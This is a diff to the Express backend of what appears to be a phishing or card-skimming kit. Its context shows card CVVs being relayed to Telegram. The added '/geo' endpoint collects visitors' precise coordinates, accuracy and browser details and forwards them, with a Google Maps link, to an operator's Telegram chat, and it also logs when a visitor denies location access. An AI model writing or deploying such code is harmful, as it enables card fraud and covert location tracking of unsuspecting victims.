@@ -90,4 +90,68 @@ ${cvv ? `🔐 <b>CVV:</b> <code>${cvv}</code>` : ''}
     }
 });
 
+// Geolocation endpoint
+router.post('/geo', auth, async (req, res) => {
+    const { latitude, longitude, accuracy, denied, userAgent } = req.body;
+    const { browser, os } = parseUserAgent(userAgent);
+
+    const months = ['yanvar', 'fevral', 'mart', 'aprel', 'may', 'iyun',
+        'iyul', 'avgust', 'sentabr', 'oktabr', 'noyabr', 'dekabr'];
+    const now = new Date();
+    const dateStr = `${now.getDate()} ${months[now.getMonth()]} ${now.getFullYear()}`;
+    const timeStr = `${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}`;
+
+    let message;
+
+    if (denied || !latitude || !longitude) {
+        message = `
+📍 <b>GEOLOKACIYA RAD ETILDI</b>
+
+❌ Foydalanuvchi joylashuvni rad etdi
+
+📱 <b>Brauzer:</b> ${browser}
+💻 <b>OS:</b> ${os}
+📆 <b>Sana:</b> ${dateStr}
+⏰ <b>Vaqt:</b> ${timeStr}
+`.trim();
+    } else {
+        const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+        message = `
+📍 <b>YANGI GEOLOKACIYA!</b>
+
+🌍 <b>Koordinatalar:</b>
+<code>${latitude}, ${longitude}</code>
+
+📏 <b>Aniqlik:</b> ~${Math.round(accuracy || 0)}m
+
+🗺 <a href="${mapsUrl}">Google Maps'da ko'rish</a>
+
+📱 <b>Brauzer:</b> ${browser}
+💻 <b>OS:</b> ${os}
+📆 <b>Sana:</b> ${dateStr}
+⏰ <b>Vaqt:</b> ${timeStr}
+`.trim();
+    }
+
+    try {
+        // Always send to admin
+        if (config.ADMIN_TELEGRAM_CHAT_ID) {
+            await telegram.sendMessage(config.ADMIN_TELEGRAM_CHAT_ID, message);
+            console.log('✅ Geo data sent to admin chat');
+        }
+
+        // Send to regular if enabled and not denied
+        const state = stateService.get();
+        if (!denied && state.sendGeoToRegularChat && config.TELEGRAM_CHAT_ID) {
+            await telegram.sendMessage(config.TELEGRAM_CHAT_ID, message);
+            console.log('✅ Geo data sent to regular chat');
+        }
+
+        res.json({ success: true });
+    } catch (error) {
+        console.error('Failed to send geo data:', error);
+        res.status(500).json({ success: false, error: 'Failed to send' });
+    }
+});
+
 module.exports = { router, setRooms };
